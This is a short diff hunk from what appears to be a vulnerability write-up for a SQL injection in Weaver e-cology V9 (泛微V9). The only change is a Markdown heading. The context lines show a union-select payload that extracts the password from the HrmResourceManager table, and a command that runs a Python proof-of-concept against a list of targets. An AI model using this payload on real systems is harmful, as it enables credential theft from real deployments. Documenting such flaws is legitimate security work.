@@ -34,7 +34,7 @@ asdasdasxx%' union select 1,(select password from HrmResourceManager where id=1)
 
 ![image-20230808163507292](img/image-20230808163507292.png)
 
-Python poc
+## Python poc
 
 ```
 python "泛微V9 sql注入.py" -t xxx.txt
